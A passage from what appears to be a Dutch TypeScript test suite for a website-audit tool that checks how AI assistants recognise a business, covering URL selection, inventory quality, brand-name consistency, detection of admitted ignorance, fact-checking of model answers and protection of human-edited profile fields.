    gekozenDiensten.length === 12,
  );
  ok("de homepage zit erbij", keuze.urls.includes("https://a.nl/"));
  ok("de contactpagina ook", keuze.urls.includes("https://a.nl/contact"));
  ok("de homepage staat vooraan", keuze.urls[0] === "https://a.nl/");

  // De sectietelling moet de WERKELIJKE omvang tonen, niet de selectie: anders
  // zegt het scherm opnieuw dat de blog 150 pagina's heeft.
  const blogSectie = keuze.sections.find((s) => s.segment === "/blog");
  eq("de blogsectie meldt zijn ware omvang", String(blogSectie?.found), "2000");
  ok("en dat er maar een deel van gelezen is", (blogSectie?.selected ?? 0) < 2000);
});

group("url-priority: dezelfde pagina kost maar één plek", () => {
  // Echt gezien in de sitemap van udenhout.nl: beide schrijfwijzen van de
  // homepage. Dat kost twee van de 150 plekken, twee fetches, en de pagina
  // staat twee keer in de prompt van de aanbodboom.
  const keuze = selectUrls(
    ["https://udenhout.nl", "https://udenhout.nl/", "https://www.udenhout.nl/", "https://udenhout.nl/diensten"],
    150,
  );
  eq("drie schrijfwijzen van de homepage tellen als één", String(keuze.totalFound), "2");
  ok("en de eerste schrijfwijze blijft staan", keuze.urls.includes("https://udenhout.nl"));

  // Een query is wél een andere pagina: `?categorie=ketels` is bij veel sites
  // echte inhoud, en die samenvouwen zou pagina's laten verdwijnen.
  const metQuery = selectUrls(["https://a.nl/zoek", "https://a.nl/zoek?c=ketels"], 150);
  eq("een query blijft een eigen pagina", String(metQuery.totalFound), "2");
});

group("url-priority: een site die wél past blijft ongemoeid", () => {
  const urls = ["https://a.nl/", "https://a.nl/diensten", "https://a.nl/contact"];
  const keuze = selectUrls(urls, 150);
  eq("alles blijft", String(keuze.urls.length), "3");
  ok("niets afgekapt", !keuze.truncated);
  eq("en het totaal klopt", String(keuze.totalFound), "3");
});

group("url-priority: een gekozen map krijgt echt voorrang", () => {
  const blogs = Array.from({ length: 500 }, (_, i) => `https://a.nl/blog/a-${i}`);
  const showroom = Array.from({ length: 40 }, (_, i) => `https://a.nl/showroom/s-${i}`);

  const zonder = selectUrls([...blogs, ...showroom], 50);
  const met = selectUrls([...blogs, ...showroom], 50, ["/showroom"]);

  const zonderShowroom = zonder.urls.filter((u) => u.includes("/showroom/")).length;
  const metShowroom = met.urls.filter((u) => u.includes("/showroom/")).length;
  ok(
    `voorrang levert meer showroompagina's op (${zonderShowroom} → ${metShowroom})`,
    metShowroom > zonderShowroom,
  );
  ok("en de hele showroom past", metShowroom === 40);
});

// ════════════════════════════════════════════════════════════════════════════
// Welke pagina's de aanbod-aanroep in gaan. Dit is de nauwste doorgang van de
// hele onboarding: ~35 van de 150 gelezen pagina's.
// ════════════════════════════════════════════════════════════════════════════

group("page-select: de dienstenpagina verliest niet meer van het blog", () => {
  const pagina = (url: string, tekens: number) => ({
    url,
    title: null,
    text: "a".repeat(tekens),
  });

  // Het echte geval: elke pagina is afgekapt op 1500 tekens, dus alle blogs
  // staan precies gelijk en de oude sortering op lengte liet de volgorde van
  // Postgres beslissen. Een dienstenpagina van 900 tekens verloor.
  const pages = [
    ...Array.from({ length: 40 }, (_, i) => pagina(`https://a.nl/blog/artikel-${i}`, 1500)),
    pagina("https://a.nl/diensten/dry-needling", 900),
    pagina("https://a.nl/diensten/sportmassage", 900),
    pagina("https://a.nl/tarieven", 700),
    pagina("https://a.nl/", 1200),
  ];

  // Ongeveer tien pagina's aan budget: krap genoeg om te moeten kiezen.
  const selectie = buildPageBlocks(pages, 15_000);

  ok("de homepage is erbij", selectie.selected.some((p) => p.url === "https://a.nl/"));
  ok(
    "beide dienstenpagina's zijn erbij",
    selectie.selected.filter((p) => p.url.includes("/diensten/")).length === 2,
  );
  ok("de tarievenpagina ook", selectie.selected.some((p) => p.url.endsWith("/tarieven")));
  ok("er is wel degelijk afgekapt", selectie.skipped > 0);
  ok("uit meerdere secties", selectie.sections >= 3);
  ok(
    "het budget wordt gerespecteerd",
    selectie.blocks.join("\n\n").length <= 15_000,
    String(selectie.blocks.join("\n\n").length),
  );
  ok(
    "en de belangrijkste pagina staat vooraan",
    selectie.selected[0].url === "https://a.nl/",
  );
});

group("page-select: lege pagina's tellen niet mee", () => {
  const selectie = buildPageBlocks(
    [
      { url: "https://a.nl/", title: null, text: "   " },
      { url: "https://a.nl/diensten", title: "Diensten", text: "echte tekst" },
    ],
    10_000,
  );
  eq("alleen de pagina met tekst", String(selectie.selected.length), "1");
  ok("en de titel staat in het blok", selectie.blocks[0].includes("· Diensten"));
});

group("inventariskwaliteit: Bol, HEMA en een gewone praktijk", () => {
  const pagina = (url: string, tekens: number) => ({ url, text: "a".repeat(tekens) });

  // Bol leverde 1 pagina op. Het rapport draaide daar gewoon op door.
  const bol = assessInventory([pagina("https://bol.com/", 4000)]);
  ok("Bol: dun", bol.verdict === "dun", bol.verdict);
  ok("Bol: met een concrete handeling", (bol.advice ?? "").length > 20);

  // HEMA: 40 pagina's, vrijwel allemaal producten.
  const hema = assessInventory(
    Array.from({ length: 40 }, (_, i) => pagina(`https://hema.nl/koken/pan-${20000 + i}.html`, 800)),
  );
  ok("HEMA: vervuild", hema.verdict === "vervuild", hema.verdict);
  ok("HEMA: het percentage staat in het advies", (hema.advice ?? "").includes("%"));

  const praktijk = assessInventory([
    pagina("https://praktijk.nl/", 900),
    pagina("https://praktijk.nl/diensten/sportmassage", 900),
    pagina("https://praktijk.nl/diensten/dry-needling", 900),
    pagina("https://praktijk.nl/over-ons", 900),
    pagina("https://praktijk.nl/blog/hardlopen", 900),
    pagina("https://praktijk.nl/contact", 900),
  ]);
  ok("gewone praktijk: voldoende", praktijk.verdict === "voldoende", praktijk.verdict);
  ok("voldoende geeft geen advies", praktijk.advice === null);

  // Wél genoeg pagina's, maar bijna geen tekst. Dat is het JavaScript-geval,
  // en het advies moet dáárover gaan en niet over de sitemap.
  const leeg = assessInventory(
    Array.from({ length: 20 }, (_, i) => pagina(`https://spa.nl/pagina-${i}`, 30)),
  );
  ok("veel pagina's zonder tekst: dun", leeg.verdict === "dun", leeg.verdict);
  ok("en het advies noemt JavaScript", (leeg.advice ?? "").includes("JavaScript"));

  const niets = assessInventory([]);
  ok("nul pagina's: dun", niets.verdict === "dun");
  ok("nul pagina's: geen deling door nul", niets.usableTextRatio === 0);
});

group("inventariskwaliteit: het oordeel 'afgekapt' (22 augustus 2026)", () => {
  const pagina = (url: string) => ({ url, text: "a".repeat(900) });
  const honderdvijftig = Array.from({ length: 150 }, (_, i) => pagina(`https://a.nl/pagina-${i}`));

  // Precies het geval dat tot nu toe niet van een volledige site te
  // onderscheiden was: 150 gelezen pagina's op een site die er 2400 heeft.
  const groot = assessInventory(honderdvijftig, { totalFound: 2400 });
  ok("site groter dan het plafond: afgekapt", groot.verdict === "afgekapt", groot.verdict);
  ok("het ware aantal staat in het advies", (groot.advice ?? "").includes("2400"));
  ok("en het gelezen aantal ook", (groot.advice ?? "").includes("150"));
  eq("het totaal wordt bewaard", String(groot.totalFound), "2400");

  // Even groot als wat we lazen: dan is er niets gemist.
  const precies = assessInventory(honderdvijftig, { totalFound: 150 });
  ok("even groot: gewoon voldoende", precies.verdict === "voldoende", precies.verdict);
  ok("en dus geen advies", precies.advice === null);

  // Niet gemeten (een profiel van vóór deze wijziging): het oordeel blijft
  // wat het was, in plaats van een totaal te verzinnen.
  const onbekend = assessInventory(honderdvijftig);
  ok("zonder meting: voldoende", onbekend.verdict === "voldoende", onbekend.verdict);
  ok("en het totaal blijft onbekend", onbekend.totalFound === undefined);

  // ⚠️ 'vervuild' gaat vóór 'afgekapt'. Bij een grote webshop zijn beide waar,
  // en "we zien vooral het assortiment" is de nuttigere melding: die zegt iets
  // over wat we hébben, de andere alleen over wat we misten.
  const webshop = assessInventory(
    Array.from({ length: 150 }, (_, i) => pagina(`https://a.nl/producten/artikel-${1000 + i}`)),
    { totalFound: 9000 },
  );
  ok("een grote webshop blijft vervuild", webshop.verdict === "vervuild", webshop.verdict);

  // Een dunne site die óók afgekapt is, blijft dun: dat is het ergere probleem.
  const dun = assessInventory(
    Array.from({ length: 20 }, (_, i) => ({ url: `https://a.nl/pagina-${i}`, text: "x" })),
    { totalFound: 3000 },
  );
  ok("dun gaat vóór afgekapt", dun.verdict === "dun", dun.verdict);
});

group("sitestructuur uit de URL-lijst", () => {
  const secties = buildTaxonomy([
    "https://a.nl/",
    "https://a.nl/diensten/massage",
    "https://a.nl/diensten/dry-needling",
    "https://a.nl/diensten/echografie",
    "https://a.nl/blog/een",
    "https://a.nl/over-ons",
  ]);
  ok("grootste sectie eerst", secties[0].segment === "/diensten", secties[0].segment);
  ok("met het juiste aantal", secties[0].count === 3, String(secties[0].count));
  // De homepage is geen sectie met één pagina maar dé pagina.
  ok("de wortel krijgt een eigen bak", secties.some((s) => s.segment === "/"));
  ok("voorbeelden worden meegegeven", secties[0].examples.length === 3);
});

group("entiteitsconsistentie: heet het bedrijf overal hetzelfde?", () => {
  // Een B.V. achter de naam is geen afwijking. Zonder deze normalisatie krijgt
  // élke klant met een rechtsvorm een waarschuwing die niets betekent, en dan
  // leest niemand de audit meer.
  ok("rechtsvorm telt niet mee", sameBrand("Jansen Bouw B.V.", "Jansen Bouw"));
  ok("hoofdletters tellen niet mee", sameBrand("JANSEN BOUW", "jansen bouw"));
  ok("een toevoeging telt niet als andere naam", sameBrand("Jansen Bouw", "Jansen Bouw Amersfoort"));
  ok("een ander bedrijf wél", !sameBrand("Jansen Bouw", "De Vries Installaties"));
  ok("leeg is nooit hetzelfde", !sameBrand("", "Jansen Bouw"));
  ok("normalisatie strippen", normalizeBrand("Jansen Bouw B.V.") === "jansen bouw");

  const basis = {
    brandName: "Jansen Bouw",
    aliases: [] as string[],
    sameAs: ["https://www.linkedin.com/company/jansen-bouw"],
    schemaTypes: ["Organization", "WebSite"],
    pagesWithSchema: 20,
    pagesCrawled: 25,
    clientRenderedPages: 0,
    wikidataId: null,
    wikipediaUrl: null,
  };

  const netjes = entityConsistencyChecks({ ...basis, foundNames: ["Jansen Bouw B.V."] });
  ok(
    "consequente naam = ok",
    netjes.find((c) => c.id === "entity.name")?.severity === "ok",
    netjes.find((c) => c.id === "entity.name")?.severity,
  );

  const rommelig = entityConsistencyChecks({
    ...basis,
    foundNames: ["Jansen Bouw B.V.", "Bouwbedrijf Jansen"],
  });
  const naamCheck = rommelig.find((c) => c.id === "entity.name");
  ok("een echte afwijking = waarschuwing", naamCheck?.severity === "warning");
  ok("en de afwijkende naam staat erin", (naamCheck?.finding ?? "").includes("Bouwbedrijf Jansen"));

  // Een alias die de klant zelf opgaf is bewust beleid, geen fout.
  const metAlias = entityConsistencyChecks({
    ...basis,
    aliases: ["Bouwbedrijf Jansen"],
    foundNames: ["Jansen Bouw B.V.", "Bouwbedrijf Jansen"],
  });
  ok(
    "een opgegeven alias is geen afwijking",
    metAlias.find((c) => c.id === "entity.name")?.severity === "ok",
  );

  // Niets gevonden is 'unknown' en niet 'warning': dat zegt iets over ons
  // kijken, niet over hun site (conventie 3).
  ok(
    "geen naam gevonden = onbekend, niet fout",
    entityConsistencyChecks({ ...basis, foundNames: [] }).find((c) => c.id === "entity.name")
      ?.severity === "unknown",
  );
});

group("de zwaarste bevinding: tekst pas na JavaScript", () => {
  const basis = {
    brandName: "SPA Corp",
    foundNames: ["SPA Corp"],
    aliases: [] as string[],
    sameAs: [] as string[],
    schemaTypes: [] as string[],
    pagesWithSchema: 0,
    pagesCrawled: 20,
    wikidataId: null,
    wikipediaUrl: null,
  };

  // Boven de helft is dit geen aandachtspunt maar een blokkade: de site is dan
  // voor een AI-assistent grotendeels leeg en betere content helpt niets.
  const veel = entityConsistencyChecks({ ...basis, clientRenderedPages: 15 });
  ok(
    "15 van 20 pagina's = blocker",
    veel.find((c) => c.id === "entity.rendering")?.severity === "blocker",
  );

  const weinig = entityConsistencyChecks({ ...basis, clientRenderedPages: 2 });
  ok(
    "2 van 20 = waarschuwing",
    weinig.find((c) => c.id === "entity.rendering")?.severity === "warning",
  );

  // Geen probleem = geen regel. Een audit die bij elke klant vijftien groene
  // vinkjes toont, verbergt de twee die ertoe doen.
  ok(
    "geen JS-probleem = geen regel",
    !entityConsistencyChecks({ ...basis, clientRenderedPages: 0 }).some(
      (c) => c.id === "entity.rendering",
    ),
  );

  // Ontbreken in Wikidata is voor een MKB'er de norm, geen fout.
  ok(
    "geen Wikidata = kans, geen waarschuwing",
    entityConsistencyChecks({ ...basis, clientRenderedPages: 0 }).find(
      (c) => c.id === "entity.knowledge",
    )?.severity === "unknown",
  );
});

group("de meetsleutel per engine (migratie 0041)", () => {
  const a = "11111111-1111-1111-1111-111111111111";
  const p = "22222222-2222-2222-2222-222222222222";

  // OpenAI houdt de OUDE sleutel zonder achtervoegsel. Er staan taken in de
  // database van vóór deze wijziging; een andere sleutel zou een lopende
  // meetronde alles opnieuw laten inplannen, een tweede betaalde web-zoekactie
  // per vraag.
  ok(
    "openai houdt de bestaande sleutel",
    dedupe.measurePrompt(a, p, 3) === `measure:${a}:${p}:w3`,
    dedupe.measurePrompt(a, p, 3),
  );
  ok(
    "expliciet openai geeft hetzelfde",
    dedupe.measurePrompt(a, p, 3, 0, "openai") === dedupe.measurePrompt(a, p, 3),
  );

  // En dit is het hele punt van de migratie: zonder engine in de sleutel ziet
  // een Gemini-meting de OpenAI-meting als "al gedaan" en meet hij nooit.
  ok(
    "gemini krijgt een eigen sleutel",
    dedupe.measurePrompt(a, p, 3, 0, "gemini") !== dedupe.measurePrompt(a, p, 3),
  );
  ok(
    "en herhalingen blijven daarbinnen uniek",
    dedupe.measurePrompt(a, p, 3, 1, "gemini") !== dedupe.measurePrompt(a, p, 3, 2, "gemini"),
  );
});

group("kent een AI-assistent dit merk? (fase 3, blok A)", () => {
  const merk = "Fysi-Unique";

  ok(
    "een inhoudelijk antwoord telt als kennen",
    knowsBrand(
      "Fysi-Unique is een fysiotherapiepraktijk in Amersfoort die zich richt op sportblessures.",
      merk,
    ),
  );

  // "Ik ken Fysi-Unique niet" BEVAT de merknaam. Zonder de toegeef-detectie zou
  // elk eerlijk niet-weten-antwoord als herkenning tellen, en dan meet dit
  // blok precies het tegenovergestelde van wat het moet meten.
  ok(
    "een eerlijk niet-weten telt NIET als kennen",
    !knowsBrand("Ik ken Fysi-Unique niet en heb hier geen betrouwbare informatie over.", merk),
  );
  ok("en dat wordt apart vastgelegd", admitsUnknown("Ik heb hier geen informatie over."));

  ok("een te kort antwoord telt niet", !knowsBrand("Fysi-Unique.", merk));
  ok(
    "een alias telt ook",
    knowsBrand(
      "Fysi Unique is een praktijk voor fysiotherapie in Amersfoort met vier therapeuten.",
      merk,
      ["Fysi Unique"],
    ),
  );
  ok(
    "een heel ander bedrijf telt niet",
    !knowsBrand("De Vries Fysiotherapie is een praktijk in Utrecht met zes behandelkamers.", merk),
  );
});

group("klopt het? Het oordeel dat het model niet zelf mag vellen", () => {
  const feiten = [
    { key: "telefoon", value: "033 123 4567" },
    { key: "adres", value: "3811 MH" },
    { key: "opgericht", value: "2012" },
  ];

  // Letterlijk genoemd = bevestigd.
  const goed = checkFacts("Je bereikt ze op 033 123 4567, ze zitten op 3811 MH en bestaan sinds 2012.", feiten);
  ok("alles bevestigd", goed.every((c) => c.verdict === "bevestigd"), JSON.stringify(goed));

  // Hetzelfde nummer, andere schrijfwijze. Dit als "niet genoemd" tellen zou de
  // uitslag onterecht drukken, +31 33 en 033 zijn hetzelfde nummer.
  const anders = checkFacts("Bel +31 33 123 45 67.", [feiten[0]]);
  ok("andere schrijfwijze telt als bevestigd", anders[0].verdict === "bevestigd", anders[0].verdict);

  // DIT is de bevinding waar het hele blok om draait.
  const fout = checkFacts("Het nummer is 020 999 8877 en ze bestaan sinds 1998.", feiten);
  ok(
    "een ánder telefoonnummer = tegengesproken",
    fout[0].verdict === "tegengesproken",
    fout[0].verdict,
  );
  ok("en het gevonden nummer staat erbij", (fout[0].found ?? "").includes("020"));
  ok("een ánder jaartal = tegengesproken", fout[2].verdict === "tegengesproken", fout[2].verdict);

  // Niets gezegd is geen fout (conventie 3): dat ChatGPT je openingstijden niet
  // noemt is iets anders dan dat hij ze fout heeft.
  const stil = checkFacts("Het is een fysiotherapiepraktijk.", feiten);
  ok("niets gezegd = niet_genoemd", stil.every((c) => c.verdict === "niet_genoemd"));

  // Vrije tekst kan deze module niet beoordelen, en dan zwijgt hij liever dan
  // dat hij beschuldigt.
  const vrij = checkFacts("Ze doen iets met gezondheid.", [{ key: "omschrijving", value: "fysiotherapie" }]);
  ok("vrije tekst wordt nooit tegengesproken", vrij[0].verdict === "niet_genoemd");
});

group("het volledige oordeel en hoe de klant het leest", () => {
  const v = buildVerdict(
    "Fysi-Unique is een fysiotherapiepraktijk. Het telefoonnummer is 020 999 8877.",
    "Fysi-Unique",
    [],
    [
      { key: "telefoon", value: "033 123 4567" },
      { key: "adres", value: "3811 MH" },
    ],
  );
  ok("het merk wordt gekend", v.knowsBrand);
  ok("één tegenspraak geteld", v.contradicted === 1, String(v.contradicted));
  ok("één niet genoemd", v.notMentioned === 1, String(v.notMentioned));

  const tekst = describeVerdict(v, "ChatGPT", "Fysi-Unique");
  ok("de zin noemt de tegenspraak", tekst.includes("tegengesproken"), tekst);

  const onbekend = buildVerdict("Ik ken dit bedrijf niet.", "Fysi-Unique", [], []);
  ok("niet gekend levert een andere zin", describeVerdict(onbekend, "Gemini", "Fysi-Unique").includes("niet te kennen"));
});

group("contextfactoren: wat de pijplijn niet kan zien (blok C)", () => {
  const factors = parseContextFactors([
    { kind: "nieuwe_website", description: "gaat live in het najaar", effective_from: "2026-10-01" },
    { kind: "naamswijziging", description: "Jansen Bouwgroep", effective_from: null },
    { kind: "gestopte_dienst", description: "Dakkapellen", effective_from: null },
    { kind: "nieuwe_regio", description: "Amersfoort", effective_from: null },
    // Ongeldige soort én een niet-object: allebei horen weg te vallen. Dit is
    // een jsonb-kolom, dus er kán van alles in staan.
    { kind: "verzonnen_soort", description: "x" },
    "geen object",
  ]);
  ok("vier geldige factoren over", factors.length === 4, String(factors.length));
  ok("de onzin is weggevallen", !factors.some((f) => f.description === "x"));

  // Het gevolg dat er het meest toe doet: een audit die zegt "voeg schema.org
  // toe aan /diensten/massage" is erger dan waardeloos als die pagina straks
  // niet bestaat, de klant gaat er wél mee aan de slag.
  const stale = technicalAdviceStale(factors);
  ok("een nieuwe website maakt het advies tijdelijk", stale !== null);
  const melding = staleAdviceNotice(stale!);
  ok("de melding noemt de datum", melding.includes("oktober"), melding);
  ok("en is verder heel", !melding.includes("hUidige"), melding);

  // Zonder deze alias telt de meting de helft van de vermeldingen niet mee: de
  // mention-classificatie eist de letterlijke naam in de tekst.
  ok("de andere naam wordt een alias", extraAliasesFrom(factors)[0] === "Jansen Bouwgroep");
  ok("de nieuwe regio komt eruit", extraRegionsFrom(factors)[0] === "Amersfoort");
  ok("de gestopte dienst komt er in kleine letters uit", discontinuedNames(factors)[0] === "dakkapellen");

  ok("geen factoren = geen melding", technicalAdviceStale([]) === null);
  ok("rommel in de kolom levert een lege lijst", parseContextFactors("nee").length === 0);
  ok("null ook", parseContextFactors(null).length === 0);
});

group("onderzoeksstappen met tussenresultaten (§8)", () => {
  const leeg = { topics: 0, auditChecks: 0, researchDone: false };

  // Halverwege: fase 0 en het onderzoek zijn geweest, het aanbod draait, de
  // rest wacht. Dat onderscheid is wat de klant wil zien.
  const halverwege = buildSteps({
    pendingByType: { profile_offering: 1 },
    facetSummaries: { techniek: "31 pagina's gevonden · 12 met gestructureerde data." },
    counts: { ...leeg, researchDone: true },
  });
  const stand = (job: string) => halverwege.find((s) => s.job === job)?.state;
  ok("de crawl is klaar", stand("profile_discover") === "klaar", stand("profile_discover"));
  ok("het onderzoek is klaar", stand("profile_research") === "klaar");
  ok("het aanbod is bezig", stand("profile_offering") === "bezig", stand("profile_offering"));
  ok("de kennistest wacht", stand("profile_llm_baseline") === "wacht");
  ok(
    "en het tussenresultaat staat erbij",
    (halverwege[0].result ?? "").includes("31 pagina's"),
    halverwege[0].result ?? "",
  );
  ok("er loopt nog iets", researchRunning(halverwege));

  // Een stap die draaide maar niets vond, moet er ANDERS uitzien dan een stap
  // die iets vond. Anders leest "0 diensten gevonden" als geslaagd. Precies
  // het stille degraderen waar dit project vangnetten tegen bouwt.
  const nietsGevonden = buildSteps({
    pendingByType: {},
    facetSummaries: { techniek: "12 pagina's gevonden." },
    counts: { topics: 0, auditChecks: 5, researchDone: true },
  });
  ok(
    "aanbod zonder resultaat = overgeslagen",
    nietsGevonden.find((s) => s.job === "profile_offering")?.state === "overgeslagen",
  );
  ok(
    "audit mét controlepunten = klaar",
    nietsGevonden.find((s) => s.job === "technical_audit")?.state === "klaar",
  );
  ok("niets loopt meer", !researchRunning(nietsGevonden));

  // Helemaal aan het begin staat alles te wachten op de eerste taak.
  const start = buildSteps({
    pendingByType: { profile_discover: 1 },
    facetSummaries: {},
    counts: leeg,
  });
  ok("de eerste stap is bezig", start[0].state === "bezig");
  ok("de rest wacht", start.slice(1).every((s) => s.state === "wacht"));

  // ⚠️ Het wachtscherm sloeg de vier standen plat tot één vinkje, dus een stap
  // die niets vond zag eruit als een geslaagde stap. `displaySteps()` houdt het
  // verschil vast.
  const getoond = displaySteps(nietsGevonden);
  const rij = (job: string) => {
    const i = nietsGevonden.findIndex((s) => s.job === job);
    return getoond[i];
  };
  ok("een stap die iets vond krijgt een vinkje", rij("technical_audit").done);
  ok(
    "en geen waarschuwing",
    !rij("technical_audit").nietsGevonden,
  );
  ok(
    "een stap die niets vond krijgt géén vinkje",
    !rij("profile_offering").done,
  );
  ok(
    "maar wel de stand 'niets gevonden'",
    rij("profile_offering").nietsGevonden,
  );

  const lopend = displaySteps(halverwege);
  const bezig = lopend[halverwege.findIndex((s) => s.job === "profile_offering")];
  ok("een lopende stap is nog niet afgehandeld", !bezig.done && !bezig.nietsGevonden);
  ok(
    "en het tussenresultaat staat in het label",
    lopend[0].label.includes("31 pagina's"),
    lopend[0].label,
  );
});

group("een mens wint van een model (blok C)", () => {
  const patch = {
    industry: "fysiotherapie",
    tone_of_voice: "zakelijk",
    products: ["massage"],
    summary: "Een praktijk.",
  };

  // Eerste ronde: er staat nog niets in profile_field_sources, dus alles mag.
  const eerste = filterProtectedFields(patch, []);
  ok("eerste ronde schrijft alles", Object.keys(eerste.allowed).length === 4);
  ok("en houdt niets tegen", eerste.blocked.length === 0);

  // Herhaalronde ná een gesprek. Dit is waar het om gaat: zonder deze filter
  // is "onderzoek opnieuw" een knop die je niet durft te gebruiken.
  const tweede = filterProtectedFields(patch, [
    { field: "tone_of_voice", source: "gesprek" },
    { field: "industry", source: "klant" },
    { field: "summary", source: "ai" },
  ]);
  ok("wat een mens zette gaat niet mee", !("tone_of_voice" in tweede.allowed));
  ok("ook niet wat de klant zette", !("industry" in tweede.allowed));
  ok("wat de AI zette mag wél opnieuw", "summary" in tweede.allowed);
  ok("een veld zonder herkomst mag ook", "products" in tweede.allowed);
  ok("en er wordt geteld wat is tegengehouden", tweede.blocked.length === 2, String(tweede.blocked.length));

  ok("gesprek telt als mens", isHumanSet("gesprek"));
  ok("klant telt als mens", isHumanSet("klant"));
  ok("ai niet", !isHumanSet("ai"));
  ok("onbekend ook niet", !isHumanSet(null));

  // Stil overschrijven én stil overslaan zijn allebei fout: het eerste kost de
  // klant zijn correcties, het tweede laat hem denken dat er niets gebeurde.
  const zin = describeMerge(tweede.blocked, { tone_of_voice: "tone of voice", industry: "branche" });
  ok("de melding noemt wat bleef staan", zin.includes("tone of voice") && zin.includes("branche"), zin);
  ok("zonder blokkades een korte melding", describeMerge([]) === "Het profiel is bijgewerkt.");
});

group("zekerheid als drie niveaus, niet als kommagetal (§8)", () => {
  ok("hoog is zeker", confidenceLevel(0.9) === "zeker");
  ok("de drempel zelf telt als zeker", confidenceLevel(0.7) === "zeker");
  ok("daaronder is onzeker", confidenceLevel(0.69) === "onzeker");
  // null is een echt antwoord en geen nul (conventie 3): "niet vastgesteld"
  // is iets anders dan "zeker onjuist".
  ok("null is onbekend", confidenceLevel(null) === "onbekend");
  ok("ontbrekend ook", confidenceLevel(undefined) === "onbekend");
  ok("nul is onzeker, niet onbekend", confidenceLevel(0) === "onzeker");
});

// ════════════════════════════════════════════════════════════════════════════
// De verificatieronde van 3 augustus 2026 (Fysi-Unique op productie). Elk van
// deze groepen hoort bij een fout die pas zichtbaar werd toen de pijplijn één
// keer helemaal doorliep. Geen enkele bestaande test ving hem.
// ════════════════════════════════════════════════════════════════════════════

group("het model dat de naam niet kan thuisbrengen, kent het merk niet", () => {
  // Letterlijk de twee antwoorden die de kennistest op 3 augustus terugkreeg.
  const a1 =
    "Fysi-Unique lijkt de naam van een fysiotherapiepraktijk of gezondheidscentrum te " +
    "zijn, maar zonder plaatsnaam of website kan ik niet met zekerheid zeggen welke " +
    "organisatie je bedoelt.";
  const a2 =
    "Ik weet niet zeker welke organisatie je bedoelt: er zijn mogelijk meerdere " +
    "bedrijven met de naam Fysi-Unique. Kun je de plaats of website delen?";

  ok("'welke organisatie je bedoelt' telt als niet kennen", admitsUnknown(a1));
  ok("'meerdere bedrijven met de naam' ook", admitsUnknown(a2));
  ok(
    "en dus kent het model het merk niet",
    !knowsBrand(a1, "Fysi-Unique", ["Fysi Unique"]) &&
      !knowsBrand(a2, "Fysi-Unique", ["Fysi Unique"]),
  );

  // ── En de andere kant op, uit de hermeting van diezelfde dag ──────────────
  //
  // Zodra het werkgebied in de vraag stond ("Fysi-Unique uit Amersfoort"),
  // antwoordde het model wél raak. De eerste reparatie nam ook losse hedges mee
  // als "niet met zekerheid", en die twee antwoorden werden daardoor als "kent
  // het merk niet" gemeld, vals negatief. De grens ligt bij identiteit, niet
  // bij details.
  const b1 =
    "Fysi-Unique in Amersfoort is een fysiotherapiepraktijk. Ze helpen bij klachten " +
    "aan het bewegingsapparaat. Ik kan zonder actuele website-informatie niet met " +
    "zekerheid zeggen welke specialisaties zij momenteel aanbieden.";
  const b2 =
    "Fysi-Unique lijkt een fysiotherapiepraktijk in Amersfoort te zijn. Ik heb zonder " +
    "actuele webtoegang geen betrouwbare details over bijvoorbeeld het adres, " +
    "behandelaren, openingstijden, specialisaties of reviews.";

  ok("twijfel over een detail is geen twijfel over het merk", !admitsUnknown(b1));
  ok("'geen betrouwbare details' evenmin", !admitsUnknown(b2));
  ok(
    "het model kent het merk in allebei",
    knowsBrand(b1, "Fysi-Unique", []) && knowsBrand(b2, "Fysi-Unique", []),
  );

  // Het omgekeerde moet blijven werken: een echt antwoord is geen twijfel.
  ok(
    "een stellig antwoord telt nog steeds als kennen",
    knowsBrand(
      "Fysi-Unique is een fysiotherapiepraktijk aan de Henry Dunantstraat in Amersfoort.",
      "Fysi-Unique",
      [],
    ),
  );
  // En "geen betrouwbare informatie", over het merk zelf, blijft wél tellen.
  ok(
    "geen betrouwbare informatie over het merk telt nog steeds",
    admitsUnknown("Ik heb geen betrouwbare informatie over dit bedrijf."),
  );
});

group("de merknaam is geen bewijs dat het model je kent", () => {
  const feiten = [
    { key: "naam", value: "Fysi-Unique", fromType: "WebSite" },
    { key: "naam", value: "Fysi Unique", fromType: "Person" },
    { key: "naam", value: "Tarieven | Fysi-Unique", fromType: "WebPage" },
    { key: "telefoon", value: "033 455 89 45", fromType: "Organization" },
  ];
  const overgebleven = checkableFacts(feiten, ["Fysi-Unique", "Fysi Unique"]);

  ok("de merknaam zelf valt af", !overgebleven.some((f) => f.key === "naam"));
  ok(
    "een paginatitel valt af",
    !overgebleven.some((f) => f.value.includes("Tarieven")),
  );
  ok(
    "het telefoonnummer blijft, dát is na te rekenen",
    overgebleven.length === 1 && overgebleven[0].key === "telefoon",
  );
  // Niets over houden is een geldige uitkomst en geen fout (conventie 3).
  ok(
    "een site zonder entiteitsopmaak levert nul controles op",
    checkableFacts(
      [{ key: "naam", value: "Fysi-Unique", fromType: "WebPage" }],
      ["Fysi-Unique"],
    ).length === 0,
  );
});

group("bereik en werkgebied horen bij elkaar", () => {
  ok(
    "lokaal mét regio blijft staan",
    resolveScope("lokaal", ["Amersfoort"]).scope === "lokaal",
  );
  // 'lokaal' zonder regio doet nergens iets: prompts.ts eist beide, en
  // llm-baseline.ts valt terug op "in Nederland". Dan liever niets beweren.
  ok(
    "lokaal zonder regio wordt null",
    resolveScope("lokaal", []).scope === null,
  );
  ok(
    "'onbekend' wordt null en niet een gok",
    resolveScope("onbekend", []).scope === null,
  );
  // Andersom is wél informatie: wie regio's noemt, is lokaal.
  ok(
    "regio's zonder bereik maken het lokaal",
    resolveScope("onbekend", ["Amersfoort"]).scope === "lokaal",
  );
  ok(
    "landelijk houdt zijn waarde",
    resolveScope("landelijk", []).scope === "landelijk",
  );
  ok(
    "dubbele regio's worden ontdubbeld",
    resolveScope("lokaal", ["Amersfoort", "amersfoort", " "]).regions.length ===
      1,
  );

  // ⚠️ MENSINVOER GAAT DOOR DEZELFDE NORMALISATIE (fase 2 van onboarding 3.0).
  //
  // `prepare-profile.ts` liet modeluitvoer hier wél langs en een getypte waarde
  // niet, terwijl `service_regions[0]` letterlijk in zes kennistestvragen wordt
  // geplakt. Deze twee gevallen zijn precies wat er dan misging.
  ok(
    "een getypte plaatsnaam met spaties wordt opgeschoond",
    resolveScope("lokaal", ["  Amersfoort  "]).regions[0] === "Amersfoort",
  );
  ok(
    "een aangevinkt 'lokaal' zonder plaatsnaam blijft geen half bereik",
    resolveScope("lokaal", ["   "]).scope === null,
  );
});

group("een citaat telt pas als het er letterlijk staat", () => {
  const pagina =
    "Bij Fysi-Unique werken we\n  zonder standaardprotocollen. Intake € 59,00.";

  ok(
    "over twee regels afgebroken citaat matcht toch",
    quoteOnPage("we werken zonder standaardprotocollen", pagina) === false &&
